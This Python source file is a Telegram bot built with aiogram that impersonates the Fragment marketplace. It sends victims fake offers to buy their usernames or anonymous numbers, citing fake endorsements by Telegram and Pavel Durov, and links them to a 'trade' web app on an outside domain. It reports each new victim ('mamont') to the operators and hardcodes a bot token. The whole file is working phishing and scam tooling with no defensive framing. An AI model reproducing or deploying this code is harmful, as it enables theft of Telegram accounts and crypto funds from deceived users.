from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, ParseMode, InlineQuery, InputTextMessageContent, InlineQueryResultArticle
from aiogram.utils import executor
from aiogram import utils
from aiogram.utils.deep_linking import decode_payload
from aiogram.utils.deep_linking import _create_link
import hashlib
import re
import asyncio
import flag
import aiohttp

# TG ID Админов через запятую
ADMINS = [976740969]
# твой домен
domain = "lin.dedust.icu"

#настройки бота
bot = Bot(token="7956328238:AAEGZ4Q5xvt0xnY-4xqPy8VHmOk8p6g4_q8", parse_mode=ParseMode.HTML, disable_web_page_preview=True)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())



async def otstuk(bot, id, fullname, is_premium, lang, username):
    flags = flag.flag(lang)
    for admin in ADMINS:
        await asyncio.sleep(1)
        try:
            await bot.send_message(admin, 
                                "<b>⚠️ [ОТСТУК] Новый пользователь в боте!\n\n"
                                f"🆔USER_ID: {id}\n"
                                f"Username: @{username}\n"
                                f"🪪 Полное имя: {fullname}\n\n"
                                f"⭐️ Премиум: {is_premium}\n"
                                f"Язык: {flags} {lang}\n"
                                "</b>")
        except utils.exceptions.BotBlocked:
            pass
        
async def ton_usdt_rate():
    url = 'https://min-api.cryptocompare.com/data/price?fsym=TON&tsyms=USDT'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return 0.0
                data = await resp.json()
                ton_price = data.get('USDT', 0.0)
                return ton_price
    except Exception as e:
        print(f"Error: {e}")
        
        
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):

    usd_to_ton_rate = await ton_usdt_rate()
        
    args = message.get_args()
    mamont = message.from_user
    if args:
        try:
            decoded = decode_payload(args)
            username, price = decoded.split('-')
        except ValueError as e:
            print(e)

        if username.startswith("+888"):
            
            username_link = username.replace("+", "")
            web_app_info = WebAppInfo(url=f"https://{domain}/?username={username_link}&price={price}")  # Замените на URL вашего веб-приложения
            keyboard = InlineKeyboardMarkup().add(
                InlineKeyboardButton(text="Go to the trade", web_app=web_app_info)
            )
            
            text = f"<b>${round(int(price)*usd_to_ton_rate, 2)} for {format_phone_number(username)}.</b> Someone offered <b>💎{price} (~${round(int(price)*usd_to_ton_rate, 2)})</b> to buy your anonymous number <b>{format_phone_number(username)}</b>.\n\nIf you wish to sell this anonymous number, please press the button below and check if the offer suits you.\n\nFragment is a verified platform for buying and selling usernames and anonymous numbers that is recommended by Telegram (<a href='https://t.me/telegram/201'>official announcement by Telegram</a>) and its founder (<a href='https://t.me/durov/198'>official announcement by Pavel Durov</a>).\n\nThis offer is likely to be serious, because the sender paid <b>💎1 (~${1*usd_to_ton_rate})</b> as a fee to let you know about it."
        
            await message.reply(text, reply_markup=keyboard)
        else:

            web_app_info = WebAppInfo(url=f"https://{domain}/?username={username}&price={price}")  # Замените на URL вашего веб-приложения
            keyboard = InlineKeyboardMarkup().add(
                InlineKeyboardButton(text="Go to the trade", web_app=web_app_info)
            )
            
            text = f"<b>${round(int(price)*usd_to_ton_rate, 2)} for @{username}.</b> Someone offered <b>💎{price} (~${round(int(price)*usd_to_ton_rate, 2)})</b> to buy your username <b>@{username}</b>.\n\nIf you wish to sell this username, please press the button below and check if the offer suits you.\n\nFragment is a verified platform for buying and selling usernames and anonymous numbers that is recommended by Telegram (<a href='https://t.me/telegram/201'>official announcement by Telegram</a>) and its founder (<a href='https://t.me/durov/198'>official announcement by Pavel Durov</a>).\n\nThis offer is likely to be serious, because the sender paid <b>💎1 (~${1*usd_to_ton_rate})</b> as a fee to let you know about it."
            
            await message.reply(text, reply_markup=keyboard)
        await otstuk(bot, mamont.id, mamont.full_name, mamont.is_premium, mamont.language_code.upper(), mamont.username)

    else:
        pass
    
def format_phone_number(phone_number):
    # Проверка, что номер начинается с +
    if phone_number.startswith('+') and len(phone_number) == 12:
        # Использование регулярного выражения для добавления пробелов
        formatted_number = re.sub(r'(\+?\d{3})(\d{4})(\d{4})', r'\1 \2 \3', phone_number)
        return formatted_number
    else:
        return phone_number

@dp.inline_handler()
async def inline_echo(inline_query: InlineQuery):
    query_text = inline_query.query.strip()

    usd_to_ton_rate = await ton_usdt_rate()

    
    if inline_query.from_user.id in ADMINS:
        try:
            if query_text:
                username, price = query_text.split(" ")
                link = await _create_link("start", f"{username}-{price}", True)

                
                if username.startswith("+888"):
                    text = f"<b>${round(int(price)*usd_to_ton_rate, 2)} for {format_phone_number(username)}.</b> Someone offered <b>💎{price} (~${round(int(price)*usd_to_ton_rate, 2)})</b> to buy your anonymous number <b>{format_phone_number(username)}</b>.\n\nIf you wish to sell this anonymous number, please press the button below and check if the offer suits you.\n\nFragment is a verified platform for buying and selling usernames and anonymous numbers that is recommended by Telegram (<a href='https://t.me/telegram/201'>official announcement by Telegram</a>) and its founder (<a href='https://t.me/durov/198'>official announcement by Pavel Durov</a>).\n\nThis offer is likely to be serious, because the sender paid <b>💎1 (~${1*usd_to_ton_rate})</b> as a fee to let you know about it."
            
                else:
                    text = f"<b>${round(int(price)*usd_to_ton_rate, 2)} for @{username}.</b> Someone offered <b>💎{price} (~${round(int(price)*usd_to_ton_rate, 2)})</b> to buy your username <b>@{username}</b>.\n\nIf you wish to sell this username, please press the button below and check if the offer suits you.\n\nFragment is a verified platform for buying and selling usernames and anonymous numbers that is recommended by Telegram (<a href='https://t.me/telegram/201'>official announcement by Telegram</a>) and its founder (<a href='https://t.me/durov/198'>official announcement by Pavel Durov</a>).\n\nThis offer is likely to be serious, because the sender paid <b>💎1 (~${1*usd_to_ton_rate})</b> as a fee to let you know about it."

                input_content = InputTextMessageContent(
                    text,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True
                )
                
                keyboard = InlineKeyboardMarkup().add(
                    InlineKeyboardButton(text="Go to trade", url = link)
                )
                    
                result_id = hashlib.md5(query_text.encode()).hexdigest()
                item = InlineQueryResultArticle(
                    id=result_id,
                    title=f"{username} 💎{price}",
                    input_message_content = input_content,
                    description = text,
                    hide_url=True,
                    reply_markup=keyboard
                )

                await bot.answer_inline_query(inline_query.id, results=[item])
            else:
                await bot.answer_inline_query(inline_query.id, results=[], cache_time=1)
        except ValueError:
            pass
                

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
